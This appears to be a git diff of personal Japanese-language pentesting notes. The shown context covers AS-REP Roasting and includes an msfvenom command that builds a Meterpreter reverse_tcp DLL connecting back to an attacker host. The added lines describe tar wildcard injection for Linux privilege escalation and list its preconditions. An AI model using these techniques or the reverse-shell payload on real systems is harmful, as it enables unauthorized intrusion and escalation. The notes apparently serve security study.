@@ -1,4 +1,4 @@
-# 知っている攻撃手法の詳細を記録していく
+# Windows
 
 ## AS-REP Roasting
 **AS-REP roastingは、Kerberos pre authenticationなしでユーザからパスワードハッシュを取得できる攻撃**のことを指す。
@@ -26,3 +26,21 @@ msfvenom等でバイナリを生成し、DLLやバイナリを生成してリバ
 ```
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.293.22 LPORT=4444 -f dll -o hoge.dll
 ```
+
+
+============-
+# Linux
+
+## ワイルドカードインジェクション  
+### 概要
+tarコマンドの第三引数に*が指定されている場合、そこに--checkpointを入れて任意のコマンド実行ができる。  
+tarがバックアップ用のスケジュールタスクだったり、root権限で実行されるようなタスクであった場合、root権限で実行して権限昇格できたりする。  
+tarが圧縮するファイルのフォルダのとこに書き込み権限が無いといけない。
+### 参考情報
+[ワイルドカードインジェクション1](https://medium.com/@silver-garcia/how-to-abuse-tar-wildcards-for-privilege-escalation-tar-wildcard-injection-612a6eac0807)  
+[ワイルドカードワイルインジェクション2](https://systemweakness.com/privilege-escalation-using-wildcard-injection-tar-wildcard-injection-a57bc81df61c)  
+
+### 攻撃の条件
+- tarの引数に*が末尾に指定されている。
+- root権限(スケジュールタスクでもいい)でtarが実行できる。
+- tarが*で圧縮ファイル群を指定する時、この圧縮ファイルたちのフォルダにファイルを作れる必要がある。
